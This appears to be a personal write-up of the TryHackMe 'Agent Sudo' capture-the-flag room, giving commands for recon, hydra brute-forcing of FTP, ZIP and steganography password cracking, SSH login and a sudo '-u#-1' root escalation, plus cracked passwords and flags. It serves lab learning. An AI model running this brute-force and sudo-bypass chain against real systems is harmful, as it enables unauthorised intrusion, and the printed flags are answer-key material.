# Matheus Jesus 10-05-2020

## Try Hack Me - [Agent Sudo](https://tryhackme.com/room/agentsudoctf)

### IP 10.10.253.47

### Recon

```sh
nmap -sC -sV -oN nmap 10.10.253.47
# 21 ftp
# 22 ssh
# 80 http server
```

### Agent C

Open the $IP on browser

There is a message from Agent R
`Use your own <b>codename</b> as user-agent to access the site.`

```sh
curl "http://10.10.253.47" -H "User-Agent: C" -L
#Attention chris
#Do you still remember our deal?
#Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
```

### Brute Forcing

On FTP, try guessing chris password, since it is weak

```sh
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.253.47:21
# [21][ftp] host: 10.10.253.47   login: chris   password: crystal
```

Access ftp through chris:crystal

```sh
ftp 10.10.253.47
chris
crystal
# get files.

# All these alien like photos are fake! Agent R stored the real picture inside your directory.
# Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
```

### Stego

```sh
binwalk -e cutie.png
#ZIP folder hidden -> it has a password

# Cracking ZIP Password
/usr/sbin/zip2john 8702.zip > zip_for_john.txt
/usr/sbin/john zip_for_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
# alien            (8702.zip/To_agentR.txt)
```

Open ZIP

```text
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By,
Agent R
```

```sh
echo QXJlYTUx | base64 -d
#Area51
steghide extract -p Area51 -sf cute-alien.jpg -v -xf msg_cute-alien.txt 
# Hi james,
# Glad you find this message. Your login password is hackerrules!
# Don't ask me why the password look cheesy, ask agent R who set this password for you.
# Your buddy,
# chris
```

### SSH Access

`james:hackerrules!`

```sh
cat user_flag.txt
# b03d975e8c92a7c04146cfa7a5a313c7
scp james@10.10.253.47:/home/james/Alien_autospy.jpg /home/matheus/projects/tryhackme/TryHackMe/agent_sudo/Alient_autopsy.jpg
```

Search image on google -> Roswell Alien Autopsy

### Privesc

```sh
scp /opt/linPEAR/linpeas.sh james@10.10.253.47:/dev/shm

sudo -l
# (ALL, !root) /bin/bash

sudo -u#-1 /bin/bash
#ROOT

cat /root/root.txt
# b53a02f55b57d4439e3341834d70c062
```
